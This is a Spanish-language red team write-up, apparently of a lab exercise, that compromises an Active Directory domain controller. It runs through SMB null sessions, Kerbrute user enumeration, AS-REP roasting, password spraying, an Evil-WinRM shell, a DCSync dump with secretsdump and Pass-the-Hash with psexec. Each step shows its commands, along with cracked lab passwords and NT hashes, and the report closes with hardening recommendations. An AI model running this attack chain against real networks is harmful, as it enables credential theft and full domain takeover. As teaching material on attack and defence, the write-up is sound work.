
# Informe de Red Team – Portfolio Profesional

## Compromiso del Controlador de Dominio -- NTDS.DIT + root.txt

**Autor:** Operador Red Team  
**Fecha:** 15 de marzo de 2026  
**Objetivo:** controller.control.nyx -- 192.168.0.40  
**Tipo de ejercicio:** Pentesting Active Directory (grey box, entorno de laboratorio)

---

## Fase 0 -- Descubrimiento del host

<img width="946" height="480" alt="image" src="https://github.com/user-attachments/assets/262499b4-f28f-4968-8199-6d6cf50db08a" />

**Comando ejecutado**

```bash
ping 192.168.0.40
```

**Resultado relevante**

- 5/5 paquetes recibidos.
- 0% de pérdida de paquetes.
- RTT medio ≈ 1,54 ms.

**Comentario personal**  
Primero verifiqué que el objetivo respondía correctamente a nivel de red; la baja latencia confirmó que podía continuar con la enumeración sin problemas de conectividad.

---

## Fase 1 -- Enumeración de servicios (Nmap)

**Imagen -- Escaneo completo de Nmap**

<img width="1025" height="479" alt="image" src="https://github.com/user-attachments/assets/db30af9e-e928-4413-b84f-37412d1f7d75" />

**Comandos ejecutados**

```bash
nmap -sS --open -sC -sV -n -Pn 192.168.0.40
nmap -sS --reason 192.168.0.40
```

**Servicios detectados (puertos TCP abiertos)**

- 53/tcp -- DNS (Simple DNS Plus)
- 88/tcp -- Kerberos-sec (Microsoft Windows Kerberos)
- 135/tcp -- MSRPC
- 139/tcp -- NetBIOS-SSN
- 389/tcp -- LDAP (Active Directory)
- 445/tcp -- SMB (microsoft-ds)
- 464/tcp -- kpasswd5
- 593/tcp -- RPC over HTTP
- 636/tcp -- LDAPS
- 3268/tcp -- Global Catalog LDAP
- 3269/tcp -- Global Catalog LDAPS
- 5985/tcp -- WinRM (HTTP)

**Identificación del host**

- Nombre: CONTROLER
- Dominio: control.nyx / control.nyx0
- Sistema: Windows 10 / Server 2019 Build 17763 x64
- SMB signing: requerido
- Desfase horario: 8h

**Comentario personal**  
En cuanto vi Kerberos (88), LDAP (389), Global Catalog (3268) y SMB (445) en el mismo host, quedó claro que estaba frente a un Controlador de Dominio. Desde ese momento, toda la estrategia se centró en Active Directory.

---

## Fase 2 -- Enumeración SMB (sin credenciales)

**Imagen 1 -- NetExec con sesión nula**

<img width="1178" height="431" alt="image" src="https://github.com/user-attachments/assets/be6490fe-5116-4721-9261-906067147d4c" />

**Comando principal**

```bash
netexec smb 192.168.0.40 -u '' -p ''
```

**Resultado**

- La conexión SMB anónima fue aceptada (null session) en el puerto 445/tcp.

**Imagen 2 -- smbclient IPC$**

<img width="1182" height="403" alt="image" src="https://github.com/user-attachments/assets/d5bceeca-605f-421c-b00d-1aef87e65a5a" />

**Comando complementario**

```bash
smbclient //192.168.0.40/IPC$ -N
```

**Observaciones**

- El login anónimo fue aceptado sobre IPC$.
- Los intentos de `ls` devolvían `ACCESS_DENIED`, pero los nombres de directorio sí se listaban, lo que confirmó la presencia de herramientas de pentesting en el entorno.

**Comentario personal**  
Confirmé que existía una null session, algo que no debería ocurrir en un Controlador de Dominio. Aunque los permisos eran limitados, este primer fallo ya mostraba que el endurecimiento de SMB era insuficiente.

---

## Fase 3 -- Enumeración DNS y LDAP

**Imagen -- consultas dig / LDAP rootDSE**

<img width="770" height="562" alt="image" src="https://github.com/user-attachments/assets/c5d519d4-b3de-4bc4-86d3-3c74755adf7f" />

**DNS -- Comandos clave**

<img width="1183" height="578" alt="image" src="https://github.com/user-attachments/assets/8aea8e1f-5ded-4d2a-8368-a91592adbebf" />

```bash
dig @192.168.0.40 controler.control.nyx A
dig @192.168.0.40 _kerberos._tcp.dc._msdcs.control.nyx SRV
dig @192.168.0.40 control.nyx0 A
```

**Resultado**

- `controler.control.nyx` → `192.168.0.40`
- `_kerberos._tcp.dc._msdcs.control.nyx` → registro SRV apuntando a `win-ula25fos4k9.control.nyx:88` (otro DC)

**LDAP -- comando rootDSE**

```bash
ldapsearch -x -H ldap://192.168.0.40 -s base namingcontexts
```

<img width="1176" height="469" alt="image" src="https://github.com/user-attachments/assets/9f873ef1-4f4f-4f04-b201-6c1b011c4b5b" />

**Contextos de nombres obtenidos**

- `DC=control,DC=nyx`
- `CN=Configuration,DC=control,DC=nyx`
- `CN=Schema,CN=Configuration,DC=control,DC=nyx`
- `DC=DomainDnsZones,DC=control,DC=nyx`
- `DC=ForestDnsZones,DC=control,DC=nyx`

**Comentario personal**  
En este punto ya había mapeado el dominio y el árbol LDAP completo sin credenciales. Eso me permitió planificar la enumeración de usuarios y los ataques Kerberos de forma muy dirigida.

---

## Fase 4 -- Enumeración de usuarios (Kerbrute)

**Imagen -- Kerbrute userenum**

<img width="930" height="589" alt="image" src="https://github.com/user-attachments/assets/c642efd3-2a4c-475a-9570-f2767d4ad2f3" />

**Imagen -- Kerbrute userenum**

<img width="824" height="490" alt="image" src="https://github.com/user-attachments/assets/a3d977b2-72fe-48bd-9e81-c3dd5c4c61d2" />

**Comandos ejecutados**

```bash
./kerbrute_linux_amd64 userenum -d control.nyx --dc 192.168.0.40 /usr/share/seclists/Usernames/top-usernames-shortlist.txt
./kerbrute_linux_amd64 userenum -d control.nyx --dc 192.168.0.40 /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
./kerbrute_linux_amd64 userenum -d control.nyx --dc 192.168.0.40 /home/kali/Downloads/windows/kerberos_enum_userlists/A-Z.Surnames.txt
```

**Usuarios válidos detectados**

- `administrator@control.nyx` / `Administrator@control.nyx`
- `B.LEWIS@control.nyx`
- `b.lewis@control.nyx` (UPN)

**Comentario personal**  
Tras varias listas y viendo cómo el KDC empezaba a saturarse, me centré en los usuarios ya confirmados como válidos, especialmente `b.lewis`, que luego utilicé como pivote para AS-REP Roasting.

---

## Fase 5 -- AS-REP Roasting (b.lewis)

**Imagen -- GetNPUsers + hash AS-REP**

<img width="1161" height="550" alt="image" src="https://github.com/user-attachments/assets/896573f1-989e-42b1-a67e-1eac35633180" />

**Comando**

```bash
impacket-GetNPUsers control.nyx/b.lewis -no-pass -dc-ip 192.168.0.40
```

**Resultado**

- Se devolvió una respuesta AS-REP sin preautenticación.
- Se obtuvo el hash AS-REP de Kerberos para `b.lewis@CONTROL.NYX`.

**Imagen -- John cracking**

<img width="1159" height="449" alt="image" src="https://github.com/user-attachments/assets/20514959-f508-4dc1-86db-22b3252ac8fe" />

**Cracking offline**

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt has.txt
```

**Contraseña recuperada**

- `b.lewis : 101Music`

**Comentario personal**  
Aquí confirmé una mala configuración de Kerberos (sin preautenticación) combinada con una contraseña presente en `rockyou.txt`. Fue la primera credencial de dominio realmente fuerte que obtuve.

---

## Fase 6 -- Acceso con credenciales (b.lewis)

**NetExec SMB con credenciales**

<img width="1159" height="471" alt="image" src="https://github.com/user-attachments/assets/d8560317-9395-49a8-8053-a01826872870" />

**NetExec SMB con credenciales**

<img width="1170" height="482" alt="image" src="https://github.com/user-attachments/assets/3d871f3b-17a9-4cb4-964c-b10723a80f1a" />

**Comandos clave**

```bash
netexec smb 192.168.0.40 -u b.lewis -p 101Music --shares
netexec smb 192.168.0.40 -u b.lewis -p 101Music --users
netexec ldap 192.168.0.40 -u b.lewis -p 101Music --groups
netexec ldap 192.168.0.40 -u b.lewis -p 101Music --computers
```

**Resultado**

- Shares accesibles: `ADMIN$`, `C$`, `NETLOGON`, `SYSVOL`.
- Enumeración de usuarios locales/dominio (Administrator, krbtgt, j.levy, etc.).
- Enumeración de grupos del dominio, con `b.lewis` en grupos privilegiados.

**Comentario personal**  
Con `b.lewis` confirmé acceso de lectura a `SYSVOL` y pude enumerar toda la estructura de usuarios y grupos. Eso validó que ya estaba en una posición de alto valor dentro del dominio.

---

## Fase 7 -- Segunda cuenta: Password Spray (j.levy)

**NetExec password spray**

<img width="1176" height="545" alt="image" src="https://github.com/user-attachments/assets/c40bc896-2735-4efd-8caf-84f78033ea38" />

**Comando**

```bash
nxc smb 192.168.0.40 -u j.levy -p /usr/share/wordlists/rockyou.txt --ignore-pw-decoding
```

**Credencial recuperada**

- `j.levy : Password1`

**Imagen -- Validación y shares**

<img width="1186" height="523" alt="image" src="https://github.com/user-attachments/assets/e103fe3d-2ac6-4792-a009-9dc85bc94038" />

```bash
nxc smb 192.168.0.40 -u j.levy -p Password1
nxc smb 192.168.0.40 -u j.levy -p Password1 --users
nxc smb 192.168.0.40 -u j.levy -p Password1 --shares
```

**Comentario personal**  
Cuando vi `Password1`, confirmé que la política de contraseñas era extremadamente débil. Esta cuenta además abrió la puerta a WinRM, lo que hizo el post-explotación mucho más cómodo.

---

## Fase 8 -- Acceso remoto (WinRM) y user.txt

**Imagen -- Shell con Evil-WinRM**

<img width="1164" height="588" alt="image" src="https://github.com/user-attachments/assets/9447c44e-24a0-4e97-924e-dc26753bfa7c" />

**Comandos**

```bash
nxc winrm 192.168.0.40 -u j.levy -p Password1
evil-winrm -i 192.168.0.40 -u j.levy -p 'Password1'
whoami /all
```

**Resultados principales**

- Identidad: `control\j.levy`
- Miembro de `Remote Management Users`
- Shell interactiva de PowerShell en el DC

**Imagen -- user.txt**

<img width="1174" height="578" alt="image" src="https://github.com/user-attachments/assets/3be8f8c9-c88e-4967-9343-6964d56a4164" />

```powershell
cd C:\Users\j.levy\Desktop
ls *# user.txt*
```

**Comentario personal**  
Con WinRM obtuve el primer indicador (`user.txt`) y confirmé que podía ejecutar herramientas y moverme por el sistema con comodidad usando la cuenta de dominio comprometida.

---

## Fase 9 -- Enumeración local (winPEAS + SharpHound)

**Subida de winPEAS y SharpHound**

<img width="842" height="571" alt="image" src="https://github.com/user-attachments/assets/e2f21cb6-172a-4a0a-aaac-76699c4cb78c" />

**Subida de winPEAS y SharpHound**

<img width="980" height="650" alt="image" src="https://github.com/user-attachments/assets/31cfcc93-6d3b-4373-87c4-0bb2de1786a0" />

**Comandos**

```powershell
upload winPEASx64.exe
upload SharpHound.exe
.\winPEASx64.exe
.\SharpHound.exe -c all
```

**Hallazgos de winPEAS (resumen)**

- Variables de entorno típicas de usuario y sistema (`USERDNSDOMAIN=control.nyx`, `COMPUTERNAME=CONTROLER`).
- No se encontraron credenciales en variables de entorno.

**SharpHound**

- Enumeró grupos, ACLs, sesiones, GPOs y más para análisis offline en BloodHound.

**Comentario personal**  
Usé winPEAS para buscar configuraciones débiles adicionales y SharpHound para consolidar la visión del dominio en BloodHound, aunque para entonces el nivel de compromiso ya era muy alto.

---

## Fase 10 -- Volcado del dominio (secretsdump / DCSync)

**Salida de secretsdump**

<img width="1182" height="495" alt="image" src="https://github.com/user-attachments/assets/599be5fd-4eb9-47fb-9af1-dc38270b05d1" />

**Comando**

```bash
impacket-secretsdump "control.nyx/j.levy:Password1@controller.control.nyx"
```

**Resultados clave (NTDS.DIT / hashes)**

- `Administrator:500:...:48b20d4f3ea31b7234c92b71c90fbff7`
- `Guest:501:...:31d6cfe0d16ae931b73c59d7e0c089c0`
- `krbtgt:502:...:b70cca1e5225303104dea9942d31f3a7`
- `control.nyx\j.levy:1103:...:64f12cddaa88057e06a81b54e73b949b`
- `control.nyx\b.lewis:1104:...:08f37c649690b7df615961f71831ef4a`
- Claves AES256/AES128/RC4 para todas las cuentas, incluyendo `krbtgt` y el DC (`CONTROLER$`).

**Comentario personal**  
En ese punto ya tenía la base completa de credenciales del dominio. Eso significa control total y la posibilidad de realizar ataques como Golden Ticket, Pass-the-Hash masivo o desplegar persistencia avanzada.

---

## Fase 11 -- Pass-the-Hash y root.txt (Administrator)

**Imagen -- Shell SYSTEM con PsExec**

<img width="1165" height="494" alt="image" src="https://github.com/user-attachments/assets/8d881955-d715-435c-8294-1f0f21e915fe" />

**Comando**

```bash
impacket-psexec -hashes :48b20d4f3ea31b7234c92b71c90fbff7 -no-pass \
-dc-ip 192.168.0.40 -target-ip 192.168.0.40 \
control.nyx/Administrator@controller.control.nyx
```

**Resultados**

- Creación remota de servicio y shell con privilegios SYSTEM.

**Imagen -- root.txt**

<img width="1136" height="517" alt="image" src="https://github.com/user-attachments/assets/06cc3d33-31f0-4de4-8738-2e97ff7dd4f2" />

```text
cd C:\Users\Administrator\Desktop
dir # root.txt (70 bytes)
```

**Comentario personal**  
Con el hash de Administrator y Pass-the-Hash obtuve una shell SYSTEM y el indicador `root.txt`, cerrando el compromiso completo del Controlador de Dominio.

---

## Resumen de la cadena de compromiso

1. Ping y Nmap → Identificación del DC y de los servicios.
2. SMB Null Session → confirmación de exposición y contexto.
3. DNS + LDAP anónimos → mapeo del dominio y contextos de nombres.
4. Kerbrute → enumeración de usuarios válidos (`administrator`, `b.lewis`, `j.levy`).
5. AS-REP Roasting → `b.lewis : 101Music`.
6. NetExec + Password Spray → `j.levy : Password1`.
7. WinRM (Evil-WinRM) → shell remota + `user.txt`.
8. winPEAS + SharpHound → enumeración local y del dominio.
9. secretsdump / DCSync → NTDS.DIT y todos los hashes del dominio.
10. Pass-the-Hash (PsExec) → shell SYSTEM con Administrator + `root.txt`.

---

## Vulnerabilidades identificadas

| Vector | Impacto | Descripción breve |
|---|---:|---|
| SMB Null Sessions | Medio | Permite enumeración inicial sin credenciales. |
| Enumeración Kerberos | Alto | Permite enumerar usuarios válidos en masa. |
| AS-REP Roasting | Alto | Permite recuperar credenciales de dominio. |
| Password Spray | Alto | Contraseñas débiles como `Password1`. |
| DCSync / NTDS.DIT | Crítico | Extracción completa de hashes del dominio. |
| Pass-the-Hash | Crítico | Ejecución remota como Administrator/SYSTEM. |
| WinRM expuesto | Alto | Shell remota directa sobre el DC. |
| SYSVOL/GPO accesible | Medio | Lectura de políticas y potencial de abuso futuro. |

---

## Recomendaciones de alto nivel

- Deshabilitar las null sessions SMB y endurecer la configuración de IPC$.
- Habilitar preautenticación Kerberos en todas las cuentas de usuario.
- Imponer políticas de contraseñas robustas y protección contra password spraying.
- Revisar y auditar estrictamente los permisos de DCSync.
- Limitar o deshabilitar el acceso WinRM desde redes no administrativas.
- Revisar los permisos de SYSVOL y GPO para evitar filtraciones y abuso.
- Monitorizar eventos de Kerberos, WinRM, DCSync y creación remota de servicios.
